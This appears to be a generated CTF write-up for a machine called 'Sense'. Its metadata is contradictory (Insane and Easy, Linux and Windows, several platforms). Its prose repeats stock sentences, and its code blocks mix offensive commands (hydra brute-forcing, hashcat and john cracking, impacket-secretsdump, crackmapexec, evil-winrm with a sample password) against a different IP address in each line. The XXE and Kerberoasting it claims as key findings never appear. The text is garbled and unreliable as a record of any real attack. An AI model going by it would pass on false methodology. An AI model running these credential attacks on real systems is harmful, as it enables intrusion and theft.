---
TitleSEO: "PwnTillDawn — Sense (Insane Linux) | ZureFX"
TitlePost: "PwnTillDawn — Sense (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Sense. Kerberoasting and XXE to achieve insane compromise on Linux."
Keywords: "reversing, forensics, insane, linux, windows, tryhackme, easy"
URL: "https://zurefx.github.io/writeups/htb-sense-714.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sense-714/"
Date: "2024-09-28"
Tags: "Reversing, Forensics, Insane, Linux, Windows, TryHackMe, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-sense-714"
Permalink: "/writeups/htb-sense-714.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Sense** is rated **Insane** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.51.137.134`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.40.147.253 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p8080,389,80 10.98.141.182 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.126.194 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.39.20.41 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.28.149.164 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions.

### SMB Enumeration

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.61.75.33/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

Key finding: **XXE**.

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.112.146.251
crackmapexec smb 10.29.60.92 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p993,25,3306 10.89.62.211 -oN scan.txt
gobuster dir -u http://10.44.156.177/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.59.175.191 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.120.31.88 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
evil-winrm -i 10.129.243.20 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `hydra`
- `secretsdump`
- `nmap`
- `gobuster`
- `hashcat`

### Key Takeaways

- Kerberoasting
- XXE
- Resource-Based Constrained Delegation
